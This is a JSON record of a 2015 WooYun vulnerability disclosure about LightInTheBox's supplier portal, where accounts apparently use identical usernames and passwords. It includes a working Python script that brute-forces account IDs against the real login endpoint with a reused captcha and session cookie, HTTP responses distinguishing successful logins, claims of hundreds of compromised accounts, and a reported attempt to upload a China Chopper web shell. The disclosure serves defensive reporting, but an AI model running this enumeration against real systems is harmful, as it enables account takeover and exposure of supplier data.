{"id": 76942, "wybug_id": "wooyun-2015-0163636", "wybug_title": "兰亭集势供应商信息泄漏", "wybug_corp": "兰亭集势", "wybug_author": "俺们那旮瘩", "wybug_date": "2015-12-22 19:30", "wybug_open_date": "2016-02-07 17:56", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向公众公开  简要描述： 供应商信息泄漏，网站设计有问题 详细说明：  兰亭集势偶然得到的一个用户名密码一样，看了下网站可以遍历一下，验证码截断之后可以使用，有一定的限制时间，以BR1100为例子，前面两个字母不变，后面数字可以遍历。对于可以正确登陆的账号密码有两种回应\nHTTP/1.1 200 OKServer: nginx/1.4.3Date: Sun, 20 Dec 2015 13:17:18 GMTContent-Type: application/json;charset=UTF-8Connection: keep-alivePragma: no-cacheExpires: Thu, 01 Jan 1970 00:00:00 GMTCache-Control: no-cacheCache-Control: no-storeSet-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Sat, 19-Dec-2015 13:17:18 GMTContent-Length: 75{\"success\":true,\"detail\":\"ç»å½æåï¼\",\"data\":\"/merchant/settled/home\"}\n上面这种可以登陆，但是会出现404错误，以BR1102为例子是这种情况。正确的登陆回应如下\nHTTP/1.1 200 OKServer: nginx/1.4.3Date: Sun, 20 Dec 2015 13:21:44 GMTContent-Type: application/json;charset=UTF-8Connection: keep-alivePragma: no-cacheExpires: Thu, 01 Jan 1970 00:00:00 GMTCache-Control: no-cacheCache-Control: no-storeSet-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Sat, 19-Dec-2015 13:21:44 GMTContent-Length: 61{\"success\":true,\"detail\":\"ç»å½æåï¼\",\"data\":\"/welcome\"}\n然后使用burp suite不太熟悉，所以上Python，如下：\nimport requestsimport reimport jsons = requests.Session()header = {\t\"Host\": \"supplierportal.litb-inc.com\",\t\"User-Agent\": \"Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20100101 Firefox/42.0\",\t\"Accept\": \"*/*\",\t\"Accept-Language\": \"en-US,en;q=0.5\",\t\"Accept-Encoding\": \"gzip, deflate\",\t\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\t\"X-Requested-With\": \"XMLHttpRequest\",\t\"Referer\": \"http://supplierportal.litb-inc.com/metis\",\t\"Content-Length\": \"41\",\t\"Cookie\": \"JSESSIONID=FCB45F6A027EBB036330D22D1C295084; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=zh; action-message=null\",\t\"Connection\": \"keep-alive\",\t\"Pragma\": \"no-cache\",\t\"Cache-Control\": \"no-cache\"}if __name__ == \"__main__\":    f = open('/Users/xxxx/webtest/lan', 'w+')    for i in range(1000,9999):        u = '%04d' % i        payload = {\"email\":'BR' + u, \"password\":\"BR\" + u, \"captcha\":\"kf2x\"}        reponse = s.post(url=\"http://supplierportal.litb-inc.com/metis/login\", data=payload, headers=header)   # with open('/Users/xxx/webtest/lanting', 'w+') as f:        if reponse.json().get('success') and reponse.json().get('data') == '/welcome':            f.write(u + '\\n')    f.close()\n前面两个字母不变，后门遍历出来的就是可以登陆的数字，这是数字为4位数的情况，在五位数的情况下也是可以的。   漏洞证明：  \n\n这是BR1111／BR1111帐户的情况，四位数的情况下我跑了309帐户，5位数的情况跑了455个，没跑完。商家后台可以修改商品的图片，价格（好像要经过人工审核），另外各种供应商的联系人、电话等。在尝试了后台上传图片，菜刀连不上，图片上传格式要求500*500，但是上传之后变成200*200，对这个不太熟悉，所以就没继续了。   修复方案：  验证码实效性有问题，默认帐户密码一样，需要改改。（我不懂，硬着头皮说的）   版权声明：转载请注明来源 俺们那旮瘩@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-12-24 18:28 厂商回复： 此漏洞会让用户操作供应商数据，可能会造成数据混乱 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}